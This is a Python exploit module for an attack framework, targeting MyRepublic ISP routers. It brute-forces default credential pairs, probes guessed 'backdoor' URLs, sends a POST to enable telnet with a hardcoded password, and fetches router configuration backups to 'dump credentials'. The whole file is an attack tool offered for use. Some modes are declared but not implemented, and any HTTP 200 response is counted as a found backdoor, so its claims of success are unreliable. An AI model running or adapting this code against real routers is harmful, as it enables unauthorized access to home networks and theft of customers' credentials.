#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MyRepublic Router Exploit Module
ISP Specific Backdoors and Vulnerabilities
"""

import requests
import socket
import time
import base64
import hashlib
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    console = Console()
except ImportError:
    class SimpleConsole:
        def print(self, msg): 
            print(msg)
    console = SimpleConsole()

import urllib3
urllib3.disable_warnings()

MODULE_INFO = {
    "name": "MyRepublic Router Exploit",
    "description": "MyRepublic ISP specific backdoors and vulnerabilities",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "arch": "arm,mips",
    "rank": "High",
    "references": [
        "ISP-Specific Backdoors",
        "MyRepublic Router Config"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {"description": "Target IP", "required": True, "default": "192.168.1.1"},
    "RPORT": {"description": "Web port", "required": False, "default": "80"},
    "PROTO": {"description": "HTTP protocol", "required": False, "default": "http", "choices": ["http", "https"]},
    "USERNAME": {"description": "Username", "required": False, "default": "admin"},
    "PASSWORD": {"description": "Password", "required": False, "default": "admin"},
    "MODE": {
        "description": "Exploit mode",
        "required": False,
        "default": "detect",
        "choices": ["detect", "backdoor", "credentials", "telnet", "config"]
    },
    "CMD": {"description": "Command", "required": False, "default": "id"},
    "LHOST": {"description": "Listener IP", "required": False, "default": "10.0.0.1"},
    "LPORT": {"description": "Listener port", "required": False, "default": "4444"},
}

# MyRepublic Specific Credentials
MYREPUBLIC_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "1234"),
    ("user", "user"),
    ("myrepublic", "myrepublic"),
    ("support", "support"),
    ("technician", "technician"),
]

class MyRepublicExploit:
    def __init__(self, target, port=80, proto="http", username="admin", password="admin"):
        self.target = target
        self.port = port
        self.proto = proto
        self.username = username
        self.password = password
        self.base_url = f"{proto}://{target}:{port}"
        self.session = requests.Session()
        if proto == "https":
            self.session.verify = False
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Referer': f'{self.base_url}/'
        })
    
    def detect_device(self):
        """Detect MyRepublic router"""
        console.print("\n[bold yellow]=== MyRepublic DETECTION ===[/bold yellow]")
        
        try:
            r = self.session.get(f"{self.base_url}/", timeout=10)
            html_content = r.text.lower()
            
            myrepublic_detected = False
            if "myrepublic" in html_content or "republic" in html_content:
                myrepublic_detected = True
                console.print("[green]✓ MyRepublic router detected[/green]")
            
            # Test common MyRepublic backdoors
            backdoors = self.test_backdoors()
            
            return {
                'is_myrepublic': myrepublic_detected,
                'backdoors_found': backdoors
            }
                
        except Exception as e:
            console.print(f"[red]✗ Detection failed: {str(e)}[/red]")
            return {'is_myrepublic': False}
    
    def test_backdoors(self):
        """Test MyRepublic specific backdoors"""
        console.print("[bold yellow][*] Testing MyRepublic backdoors...[/bold yellow]")
        
        backdoors = []
        
        # Test common backdoor endpoints
        endpoints = [
            "/api/debug", "/cgi-bin/debug", "/backdoor",
            "/technician", "/support", "/maintenance",
            "/cgi-bin/luci/admin"
        ]
        
        for endpoint in endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    backdoors.append(endpoint)
                    console.print(f"[green]✓ Backdoor found: {endpoint}[/green]")
            except:
                continue
        
        return backdoors
    
    def exploit_backdoor(self):
        """Exploit MyRepublic backdoor"""
        console.print("[bold yellow][*] Exploiting MyRepublic backdoor...[/bold yellow]")
        
        try:
            # Try to enable telnet via backdoor
            enable_url = f"{self.base_url}/cgi-bin/luci/admin/telnet"
            payload = {"enable": "1", "password": "myrepublic"}
            
            r = self.session.post(enable_url, data=payload, timeout=10)
            if r.status_code == 200:
                console.print("[green]✓ Telnet enabled via backdoor[/green]")
                return True
        except Exception as e:
            console.print(f"[red]✗ Backdoor exploit failed: {str(e)}[/red]")
        
        return False
    
    def dump_credentials(self):
        """Dump MyRepublic router credentials"""
        console.print("[bold yellow][*] Dumping credentials...[/bold yellow]")
        
        try:
            # Try to access config files
            config_urls = [
                f"{self.base_url}/config.bin",
                f"{self.base_url}/backup.cfg",
                f"{self.base_url}/romfile.cfg"
            ]
            
            for url in config_urls:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200:
                    console.print(f"[green]✓ Config file found: {url}[/green]")
                    return True
        except Exception as e:
            console.print(f"[red]✗ Credential dump failed: {str(e)}[/red]")
        
        return False

def run(session, options):
    """Main MyRepublic exploit function"""
    console.print(Panel("MyRepublic Router Exploit", style="bold magenta"))
    
    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    proto = options.get("PROTO", "http")
    username = options.get("USERNAME", "admin")
    password = options.get("PASSWORD", "admin")
    mode = options.get("MODE", "detect")
    
    console.print(f"[bold yellow][*] Target: {proto}://{rhost}:{rport}[/bold yellow]")
    
    try:
        exploit = MyRepublicExploit(rhost, rport, proto, username, password)
        
        if mode == "detect":
            result = exploit.detect_device()
            if result['is_myrepublic']:
                console.print("[green]✓ MyRepublic router detected[/green]")
                console.print(f"[cyan]Backdoors found: {len(result['backdoors_found'])}[/cyan]")
            else:
                console.print("[red]✗ Not a MyRepublic router[/red]")
        
        elif mode == "backdoor":
            exploit.exploit_backdoor()
        
        elif mode == "credentials":
            exploit.dump_credentials()
        
        return True
        
    except Exception as e:
        console.print(f"[bold red]✗ Error: {str(e)}[/bold red]")
        return False
